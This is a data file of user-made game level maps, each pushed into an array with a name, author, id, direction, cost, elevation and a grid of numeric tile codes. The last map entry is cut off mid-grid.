maps.push({name="GoGoParkour",author="GoGoShooter",id="#1650916909",direction="forward",cost=212,elevation=-10,map=[1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,0,0,24,24,24,0,0,0,24,24,0,0,0,24,24,24,0,0,1,1,0,24,24,24,24,3,5,3,24,24,3,5,3,24,24,24,24,0,1,1,0,92,24,24,24,0,0,0,0,0,0,0,0,24,24,24,92,0,1,1,0,0,0,3,0,0,0,0,0,0,0,0,0,0,3,0,0,0,1,1,0,0,0,5,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1,1,0,0,0,3,0,0,0,0,97,93,0,0,0,0,3,0,0,0,1,1,0,0,22,22,22,0,0,0,20,20,0,0,0,22,22,22,0,0,1,1,0,22,22,22,22,3,5,0,3,3,0,5,3,22,22,22,22,0,1,1,0,0,22,22,22,0,0,0,5,5,0,0,0,22,22,22,0,0,1,1,0,0,0,22,0,0,0,0,0,0,0,0,0,0,22,0,0,0,1,1,0,0,0,96,0,0,0,0,100,94,0,0,0,0,96,0,0,0,1,1,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,1,1,0,18,18,0,0,0,0,0,14,14,0,0,0,0,0,18,18,0,1,1,0,18,18,0,0,0,0,0,14,14,0,0,0,0,0,18,18,0,1,1,0,18,18,0,0,0,16,0,14,14,0,16,0,0,0,18,18,0,1,1,0,0,0,0,16,16,16,0,14,14,0,16,16,16,0,0,0,0,1,1,0,0,0,0,16,0,0,0,14,14,0,0,0,16,0,0,0,0,1,1,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1]});
maps.push({name="denebe",author="FLaN KS",id="#1650984011",direction="forward",cost=400,elevation=0,map=[5,24,5,24,5,24,5,24,5,2,2,24,5,24,5,24,5,24,5,24,24,5,24,5,24,5,24,5,24,5,5,5,24,5,24,5,24,5,24,5,5,24,5,24,5,24,5,24,5,5,5,5,5,24,5,24,5,24,5,24,24,5,24,5,24,5,24,5,5,5,24,5,5,5,24,5,24,5,24,5,5,24,5,24,5,24,5,5,5,24,5,24,5,5,5,24,5,24,5,24,24,5,24,5,24,5,5,5,24,5,24,5,24,5,5,5,24,5,24,5,5,24,5,24,5,5,5,24,5,24,5,24,5,24,5,5,5,24,5,24,24,5,24,5,5,5,24,5,24,5,24,5,24,5,24,5,5,5,24,5,5,24,5,5,5,24,5,24,5,24,5,24,5,24,5,24,5,5,5,24,24,5,5,5,24,5,24,5,24,5,24,5,24,5,24,5,24,5,5,24,24,5,5,24,5,24,5,24,5,24,5,24,5,24,5,24,5,24,5,24,24,5,5,5,24,5,24,5,24,5,24,5,24,5,24,5,24,5,5,24,5,24,5,5,5,24,5,24,5,24,5,24,5,24,5,24,5,5,5,24,24,5,24,5,5,5,24,5,24,5,24,5,24,5,24,5,5,5,24,5,5,24,5,24,5,5,5,24,5,24,5,24,5,24,5,5,5,24,5,24,24,5,24,5,24,5,5,5,24,5,24,5,24,5,5,5,24,5,24,5,5,24,5,24,5,24,5,5,5,24,5,24,5,5,5,24,5,24,5,24,24,5,24,5,24,5,24,5,5,5,24,5,5,5,24,5,24,5,24,5,5,24,5,24,5,24,5,24,5,5,5,5,5,24,5,24,5,24,5,24,24,5,24,5,24,5,24,5,24,2,2,24,24,5,24,5,24,5,24,5]});
maps.push({name="Steps Down",author="Hichatu",id="#1650986669",direction="forward",cost=200,elevation=-19,map=[0,2,2,0,21,0,18,0,15,0,12,0,9,0,6,0,5,5,0,0,0,24,24,0,21,0,18,0,15,0,12,0,9,0,6,0,5,5,0,0,0,24,24,0,21,0,18,0,15,0,12,0,9,0,6,0,5,5,0,0,0,24,24,0,21,0,18,0,15,0,12,0,9,0,6,0,5,5,0,0,0,24,24,0,21,0,18,0,15,0,12,0,9,0,6,0,5,5,0,0,0,24,24,0,21,0,18,0,15,0,12,0,9,0,6,0,5,5,0,0,0,24,24,0,21,0,18,0,15,0,12,0,9,0,6,0,5,5,0,0,0,24,24,0,21,0,18,0,15,0,12,0,9,0,6,0,5,5,0,0,0,24,24,0,21,0,18,0,15,0,12,0,9,0,6,0,5,5,0,0,0,24,24,0,21,0,18,0,15,0,12,0,9,0,6,0,5,5,0,0,0,24,24,0,21,0,18,0,15,0,12,0,9,0,6,0,5,5,0,0,0,24,24,0,21,0,18,0,15,0,12,0,9,0,6,0,5,5,0,0,0,24,24,0,21,0,18,0,15,0,12,0,9,0,6,0,5,5,0,0,0,24,24,0,21,0,18,0,15,0,12,0,9,0,6,0,5,5,0,0,0,24,24,0,21,0,18,0,15,0,12,0,9,0,6,0,5,5,0,0,0,24,24,0,21,0,18,0,15,0,12,0,9,0,6,0,5,5,0,0,0,24,24,0,21,0,18,0,15,0,12,0,9,0,6,0,5,5,0,0,0,24,24,0,21,0,18,0,15,0,12,0,9,0,6,0,5,5,0,0,0,24,24,0,21,0,18,0,15,0,12,0,9,0,6,0,5,5,0,0,0,24,24,0,21,0,18,0,15,0,12,0,9,0,6,0,2,2,0,0]});
maps.push({name="Downwards",author="tormacoy",id="#1650986756",direction="right",cost=308,elevation=-12,map=[1,2,2,24,24,23,23,22,1,1,0,0,0,0,0,0,0,0,0,0,1,24,24,24,24,23,23,22,22,1,1,0,0,0,0,0,0,0,0,0,1,24,24,24,24,23,86,22,22,21,1,1,0,0,0,0,0,0,0,0,1,23,23,86,23,23,23,22,22,21,21,1,1,0,0,0,0,0,0,0,1,23,23,23,23,23,23,22,22,86,21,20,1,0,0,0,0,0,0,0,1,22,22,22,22,22,86,22,22,21,21,20,1,1,0,0,0,0,0,0,1,22,22,86,22,22,22,22,22,86,21,20,20,1,0,0,0,0,0,0,1,86,21,21,21,86,21,21,21,21,21,20,86,1,1,0,0,0,0,0,1,21,21,21,21,21,21,21,21,21,86,20,20,19,1,1,0,0,0,0,1,20,20,20,20,20,20,86,20,20,20,20,20,19,1,1,0,0,0,0,1,20,86,20,86,20,20,20,20,20,20,20,20,19,19,1,1,0,0,0,1,1,19,19,19,19,19,19,19,19,86,19,19,86,19,18,1,1,0,0,0,1,19,19,19,19,19,19,86,19,19,19,19,19,19,18,1,1,1,0,0,1,1,18,86,18,86,18,18,18,18,18,86,18,18,18,17,1,1,1,0,0,1,17,86,17,17,17,86,17,17,17,17,86,17,17,86,1,1,1,0,0,1,15,15,15,15,15,15,15,15,86,15,15,15,15,15,15,1,1,0,0,0,1,1,1,1,1,14,86,14,14,14,14,14,14,14,14,86,12,0,0,0,1,1,1,1,1,1,1,13,13,13,86,13,13,86,13,12,2,0,0,0,0,1,1,1,1,1,1,1,12,12,12,12,12,12,12,12,2,0,0,0,0,1,1,1,1,1,1,1,1,1,12,12,86,12,12,12,12]});
maps.push({name="Steps Down 2",author="Hichatu",id="#1650987041",direction="right",cost=96,elevation=-12,map=[0,2,2,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,10,94,93,10,0,0,0,0,0,12,12,2,0,24,24,0,0,0,0,0,10,10,10,10,0,0,0,0,0,12,12,2,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,12,12,0,0,0,0,0,0,13,13,0,0,23,23,0,0,0,0,0,0,12,12,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,0,0,14,14,0,0,0,0,0,0,14,14,0,0,22,22,0,0,0,0,0,0,14,14,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,21,21,0,0,0,0,0,0,16,16,0,0,0,0,0,0,15,15,0,0,21,21,0,0,0,0,0,0,16,16,0,0,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,20,20,0,0,19,19,0,0,18,18,0,0,17,17,0,0,16,16,0,0,20,20,0,0,19,19,0,0,18,18,0,0,17,17,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Duel of the Fates",author="Gemzis",id="#1651008302",direction="right",cost=586,elevation=3,map=[24,77,0,2,2,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,77,0,5,5,0,77,77,77,77,77,77,77,77,77,77,77,77,77,24,24,77,0,5,5,76,76,76,0,0,0,0,0,0,0,0,0,0,77,24,24,77,0,6,6,76,76,76,9,5,5,5,88,5,5,5,0,0,77,24,24,77,0,6,6,76,76,6,9,6,85,5,5,88,7,7,0,0,77,24,24,77,0,7,7,76,6,93,9,6,6,76,76,76,7,7,0,0,77,24,24,77,0,7,7,76,76,6,9,47,47,76,76,95,95,95,0,0,77,24,24,77,0,48,48,76,6,76,76,91,91,76,76,9,9,0,0,0,77,24,24,77,0,48,48,76,6,76,76,91,91,76,76,10,10,0,0,0,77,24,24,77,0,49,49,76,6,76,76,48,48,76,76,10,10,30,30,9,8,2,24,77,0,95,95,95,49,48,48,48,48,76,76,10,10,30,30,9,8,2,24,67,0,49,49,49,49,48,48,48,48,76,76,51,51,0,0,0,67,24,24,67,0,49,49,6,70,70,6,70,70,6,70,51,51,0,0,0,67,24,24,67,0,49,49,70,70,6,70,6,70,70,6,51,51,0,0,0,67,24,24,67,0,50,50,70,6,70,6,70,6,70,70,51,51,0,0,0,67,24,24,67,0,92,92,6,70,6,70,70,70,70,6,51,51,94,0,0,67,24,24,67,0,36,36,36,37,38,92,0,0,38,92,51,51,0,0,0,67,24,24,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,24,24,67,67,67,67,67,67,67,67,67,67,67,67,67,67,67,67,67,67,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24]});
maps.push({name="Pool Day",author="qw0x",id="#1651008329",direction="left",cost=327,elevation=0,map=[24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,24,2,2,24,24,90,20,20,85,20,85,91,20,20,20,90,20,90,24,0,24,20,20,24,24,20,20,85,91,20,20,85,20,20,20,20,20,20,24,0,24,20,20,24,24,20,20,24,24,24,24,24,24,24,24,24,20,20,24,0,24,20,90,24,24,20,20,24,0,0,0,0,0,0,0,24,20,20,24,0,24,20,20,24,24,20,20,24,20,20,20,20,20,20,0,24,90,20,24,0,24,20,20,24,24,20,20,24,20,66,66,66,66,20,0,24,85,20,24,0,24,90,20,24,24,20,20,20,20,71,70,66,66,20,0,24,91,85,24,0,24,20,20,24,24,95,95,20,20,74,70,66,66,20,0,24,20,20,24,0,24,20,20,24,0,0,0,24,24,71,70,72,66,20,0,24,20,20,24,0,24,20,20,24,0,0,0,0,24,71,70,66,66,20,0,24,20,20,24,0,24,20,20,24,0,92,0,0,20,66,66,66,66,20,0,24,96,96,24,0,24,91,91,24,24,20,20,20,20,20,20,20,20,20,0,24,20,20,24,24,24,20,20,24,2,20,24,0,0,0,0,0,0,0,24,20,73,66,66,20,20,20,20,24,2,20,24,0,0,0,0,0,0,0,24,20,73,66,66,20,20,20,90,24,24,24,24,0,0,0,0,0,0,0,20,97,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Cute Roads",author="qw0x",id="#1651008364",direction="right",cost=214,elevation=0,map=[0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,0,100,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,27,27,27,27,90,27,27,0,0,0,0,0,0,0,0,4,4,0,0,0,3,0,0,0,0,0,27,27,27,27,0,0,0,32,0,12,12,0,0,0,33,0,0,0,0,0,28,0,0,27,27,0,0,3,0,13,13,0,0,0,33,33,32,31,30,29,28,0,77,0,27,0,0,36,0,0,13,0,0,0,33,0,0,0,0,0,0,77,25,77,27,0,0,100,0,0,92,0,0,0,88,0,0,0,0,0,0,0,77,0,28,2,0,0,0,0,0,0,0,0,33,0,52,52,52,52,0,50,49,48,28,2,0,67,67,0,0,0,0,0,33,0,52,0,0,0,92,0,0,0,28,0,67,28,28,66,68,68,68,68,68,68,68,66,28,28,28,28,28,28,28,0,0,67,67,0,0,0,0,0,33,0,52,0,0,0,0,100,0,0,0,0,0,0,0,0,33,0,0,0,33,0,52,0,0,0,0,0,0,0,0,0,0,0,0,0,33,33,33,33,33,0,52,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,52,0,0,0,67,0,67,0,0,0,0,77,0,77,0,33,0,0,0,0,52,0,0,67,25,0,25,67,0,0,77,25,0,25,77,4,0,0,0,0,88,0,0,0,0,0,0,0,0,0,0,0,0,0,0,37,0,0,0,0,52,0,0,67,25,0,25,67,0,0,77,25,0,25,77,100,37,52,52,52,52,0,0,0,67,0,67,0,0,0,0,77,0,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Nice and Perky",author="qw0x",id="#1651008430",direction="right",cost=235,elevation=-2,map=[1,2,2,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,1,59,59,58,58,58,58,58,58,57,57,57,56,1,1,0,0,0,0,0,1,59,59,58,58,58,58,58,58,57,57,57,56,55,1,0,0,0,0,0,1,59,59,58,58,58,58,58,58,57,57,57,56,55,54,1,0,0,0,0,1,59,59,59,58,58,58,58,58,57,57,57,56,55,54,53,1,0,0,0,1,1,58,59,58,58,58,58,58,57,57,57,56,55,54,53,1,0,0,0,0,1,1,58,58,58,58,58,58,57,57,57,56,55,54,53,1,0,0,0,0,0,1,1,58,58,58,58,58,57,57,57,56,55,54,53,1,0,0,0,0,0,0,1,1,58,58,58,58,57,57,57,56,55,54,53,1,0,0,0,0,0,0,0,1,1,58,58,58,57,57,57,56,55,54,53,1,0,0,0,0,0,0,0,0,1,58,58,58,57,57,57,56,55,54,53,1,0,0,0,0,0,0,0,0,1,1,58,58,57,57,57,56,55,54,53,1,0,0,0,0,0,0,0,0,0,1,58,58,57,57,57,56,55,1,1,18,17,17,2,0,0,0,0,0,0,1,1,58,57,57,57,56,1,18,18,17,17,17,2,0,0,0,0,0,0,0,1,58,57,57,1,1,18,17,17,17,0,0,0,0,0,0,0,0,0,0,1,86,86,86,1,18,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,86,86,18,18,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,86,18,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,100,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="747",author="qw0x",id="#1651008455",direction="left",cost=206,elevation=-10,map=[0,76,10,10,3,19,0,2,2,0,19,0,18,0,0,17,0,0,0,0,0,10,76,10,0,19,19,19,19,19,19,0,18,18,0,0,17,0,0,0,0,76,9,76,0,19,0,0,0,0,19,0,18,0,17,0,0,0,0,0,0,9,76,9,0,19,0,0,90,0,19,0,0,17,0,0,16,0,0,0,0,76,8,76,0,19,0,0,0,0,19,0,17,0,93,15,0,0,0,0,0,8,76,8,4,19,0,0,0,0,19,0,0,14,0,0,17,0,0,0,96,76,8,76,0,19,90,0,90,0,19,0,14,0,0,76,18,18,19,0,7,96,76,8,0,18,0,0,0,0,18,0,15,76,17,17,0,0,19,0,0,8,96,76,0,16,0,0,0,0,17,0,16,16,0,0,0,19,19,0,0,0,9,96,0,15,0,90,0,90,16,0,15,0,0,0,18,19,0,0,0,0,0,12,12,14,0,0,0,0,15,14,0,0,97,17,18,0,0,0,7,0,0,0,12,13,0,90,0,0,14,0,0,0,17,17,0,0,0,0,7,7,0,0,0,12,0,0,0,90,14,0,0,16,17,0,0,0,0,0,7,10,9,0,0,11,0,0,0,0,14,0,14,15,0,0,0,0,0,0,0,9,9,10,0,11,0,32,32,0,13,14,0,0,0,0,0,0,0,0,0,0,10,10,11,11,0,0,0,0,12,0,0,0,0,0,0,0,0,0,96,96,96,0,0,0,10,0,0,12,0,0,0,0,0,0,0,0,0,0,2,9,96,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,2,9,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="de escalate",author="iProbie",id="#1651038774",direction="forward",cost=80,elevation=-17,map=[0,0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,21,21,21,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="needle in haystack",author="iProbie",id="#1651043696",direction="forward",cost=388,elevation=0,map=[0,0,0,0,0,0,0,1,25,2,2,25,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,25,25,25,25,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,25,25,25,25,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,25,25,25,25,1,0,0,0,0,0,0,0,0,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,0,0,25,26,26,26,26,26,26,26,26,26,26,26,26,26,26,26,26,25,0,0,25,26,97,97,97,97,97,97,97,97,97,97,97,97,97,97,26,25,0,0,25,26,97,97,97,97,97,97,97,97,97,97,97,97,97,97,26,25,0,0,25,26,97,97,97,97,97,97,97,97,97,97,97,97,97,97,26,25,0,0,25,26,97,97,97,97,97,97,97,97,97,97,97,97,97,97,26,25,0,0,25,26,97,97,97,97,97,97,97,97,97,97,97,97,97,97,26,25,0,0,25,26,97,97,97,97,97,97,97,97,97,97,97,97,97,97,26,25,0,0,25,26,97,97,97,97,97,97,97,97,97,99,97,97,97,97,26,25,0,0,25,26,97,97,97,97,97,97,97,97,97,97,97,97,97,97,26,25,0,0,25,26,26,26,26,26,26,26,26,26,26,26,26,26,26,26,26,25,0,0,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,0,0,0,0,0,0,0,0,1,25,25,25,25,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,25,25,25,25,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,98,98,98,98,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,98,2,2,98,1,0,0,0,0,0,0,0]});
maps.push({name="KItty",author="Kitty Cat",id="#1651054666",direction="forward",cost=377,elevation=0,map=[0,0,0,0,1,1,1,1,1,1,1,1,1,1,0,0,0,1,2,2,0,0,0,1,1,9,9,9,9,9,9,9,9,9,1,0,0,1,5,5,0,0,1,1,30,9,9,9,9,9,9,9,9,9,9,1,0,1,5,5,0,1,1,31,30,9,1,1,1,9,9,9,9,9,9,9,1,1,85,85,1,1,97,31,30,9,1,66,1,9,9,9,9,9,9,9,9,1,6,6,0,1,1,31,30,9,1,1,1,90,90,9,9,9,9,9,9,1,85,85,0,0,1,1,30,9,9,9,9,90,90,1,1,9,9,9,9,1,7,7,0,0,0,1,1,9,9,9,9,9,9,9,1,9,9,9,9,98,8,8,0,0,0,1,9,1,9,9,9,1,9,9,1,91,1,1,9,98,8,99,0,0,0,1,9,1,96,96,96,1,1,1,1,49,49,94,1,1,1,1,0,0,0,1,9,1,96,96,96,1,1,1,1,49,49,49,1,1,1,1,0,0,0,1,9,1,9,9,9,1,9,9,1,1,1,1,9,9,8,8,0,0,0,1,1,9,9,9,9,9,9,9,1,9,9,9,9,9,8,8,0,0,1,1,10,9,9,9,90,90,90,1,1,9,9,9,9,1,7,7,0,1,1,12,10,9,9,1,90,90,90,9,9,9,9,9,9,1,7,7,1,1,93,12,10,9,9,1,90,90,90,9,9,9,9,9,9,1,6,6,0,1,1,12,10,9,9,1,9,9,9,9,9,9,9,9,1,1,6,6,0,0,1,1,10,9,9,9,9,9,9,9,9,9,9,1,0,1,5,5,0,0,0,1,1,9,9,9,9,9,9,9,9,9,1,0,0,1,5,5,0,0,0,0,1,1,1,1,1,1,1,1,1,1,0,0,0,1,2,2]});
maps.push({name="bigL",author="iProbie",id="#1651077725",direction="right",cost=108,elevation=-19,map=[0,0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,65,65,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,21,15,15,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,15,15,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,15,15,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,15,15,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,15,15,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,15,15,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,14,13,12,11,10,9,8,7,6,5,5,0,0,0,0,0,15,15,15,15,65,5,5,5,5,5,5,5,5,5,2,0,0,0,0,0,15,15,15,15,65,5,5,5,5,5,5,5,5,5,2,0,0,0,0,0,15,15,15,15,14,13,12,11,10,9,8,7,6,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Squid is a furry",author="Papaj",id="#1651128157",direction="forward",cost=58,elevation=0,map=[2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Ze4Life",author="gxp",id="#1651151973",direction="right",cost=470,elevation=7,map=[67,5,2,2,5,67,67,67,67,1,67,67,67,67,67,67,67,67,67,67,67,0,5,5,0,0,9,10,67,1,36,92,12,12,12,12,12,12,12,2,67,0,6,0,0,9,0,11,67,1,0,0,67,67,67,67,67,67,12,2,67,0,7,0,9,0,0,12,67,1,35,0,0,0,0,0,0,67,12,67,67,0,8,9,0,0,0,13,67,1,0,0,0,0,0,0,0,67,12,67,67,0,0,0,0,0,0,0,67,1,34,0,0,0,0,0,0,0,92,67,67,0,14,14,14,14,14,14,67,1,0,0,21,0,0,0,0,0,21,67,67,0,13,0,0,11,0,13,67,1,33,92,21,21,21,21,21,21,21,67,67,0,12,0,0,11,0,12,67,1,0,0,21,67,67,67,67,67,21,67,67,0,11,0,0,11,0,11,67,1,32,0,0,0,0,0,0,0,0,67,67,0,0,0,0,0,0,0,67,1,0,0,23,23,23,23,23,23,23,67,67,0,0,0,0,0,0,0,67,1,32,92,23,67,67,23,67,67,67,67,67,0,30,30,30,0,0,0,67,1,0,0,23,0,0,23,0,0,0,67,67,0,0,0,30,0,0,0,67,1,31,0,0,0,0,0,0,0,0,67,67,0,0,0,30,0,0,0,67,1,0,0,24,24,24,24,24,24,24,67,67,0,30,30,30,30,30,30,30,103,30,92,24,67,67,24,67,67,24,67,67,0,0,0,30,0,0,0,67,1,0,0,24,0,0,24,0,0,24,67,24,24,24,0,92,0,0,0,67,1,0,0,24,0,0,24,0,0,24,67,24,104,24,24,24,0,0,0,67,1,0,0,24,0,0,24,0,0,24,67,24,24,24,67,67,67,67,67,67,1,67,67,67,67,67,67,67,67,67,67]});
maps.push({name="Lbg",author="beach escape guy",id="#1651177397",direction="forward",cost=483,elevation=0,map=[1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,5,5,5,6,6,6,6,6,6,6,76,66,1,1,1,1,1,1,1,1,5,5,5,6,66,66,66,66,66,6,76,66,1,1,1,1,1,1,1,1,5,5,5,6,6,6,6,6,66,6,76,66,1,1,1,1,1,1,1,1,5,5,5,6,6,6,6,6,66,6,76,66,1,1,1,1,1,1,1,1,5,5,5,6,6,6,6,6,6,6,76,66,1,1,1,1,1,1,1,1,5,5,5,6,6,6,6,6,6,6,76,66,1,1,1,1,1,1,1,1,5,5,5,6,66,66,66,66,66,6,76,66,1,1,1,1,1,1,1,1,5,5,5,6,66,6,66,6,66,6,76,66,1,1,1,1,1,1,1,1,5,5,5,6,66,66,6,66,66,6,76,66,1,1,1,1,1,1,1,1,5,5,5,6,6,6,6,6,6,6,76,66,1,1,1,1,1,1,1,1,5,5,5,6,6,6,6,6,6,6,76,66,1,1,1,1,1,1,1,1,5,5,5,6,66,66,66,66,66,6,76,66,5,5,5,5,5,5,1,1,5,5,5,6,66,6,6,6,66,6,76,66,5,5,5,5,5,5,1,1,5,5,5,6,66,6,66,6,66,6,76,66,5,5,5,5,5,5,1,1,5,5,5,6,66,6,66,66,66,6,76,66,5,5,5,5,5,5,1,1,5,5,5,6,6,6,6,6,6,6,76,66,5,5,5,5,5,5,1,1,5,5,5,6,6,6,6,6,6,6,6,66,5,5,5,5,5,5,1,1,5,5,5,6,6,6,6,6,6,6,6,66,5,5,5,5,5,5,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1]});
maps.push({name="tom hanks",author="CoolDude",id="#1651283446",direction="left",cost=345,elevation=0,map=[0,16,2,2,19,19,19,24,24,16,16,16,16,16,0,0,0,0,0,0,0,16,13,13,66,68,68,68,68,68,68,68,68,66,13,13,13,0,0,0,0,16,13,13,66,68,68,68,68,68,68,68,68,66,13,13,13,33,0,0,0,16,96,96,19,19,19,24,24,16,16,16,16,16,13,13,13,0,0,0,0,0,13,13,19,13,13,13,24,0,0,0,0,40,3,13,13,0,34,0,0,0,13,13,19,13,99,13,24,0,40,40,0,0,13,13,13,0,0,0,0,0,13,13,19,13,13,13,24,0,0,0,0,0,13,13,13,0,0,35,0,0,13,13,19,76,76,76,24,0,40,0,0,0,13,13,13,0,0,0,0,0,13,13,19,76,13,76,24,0,97,0,0,24,96,96,96,0,0,36,0,0,13,13,19,76,76,76,24,0,0,0,24,0,0,13,13,1,0,0,0,98,98,98,19,13,13,13,24,24,24,24,24,0,0,13,13,1,0,17,0,13,13,13,98,13,13,13,13,76,13,76,13,76,13,13,13,1,0,97,0,13,13,13,98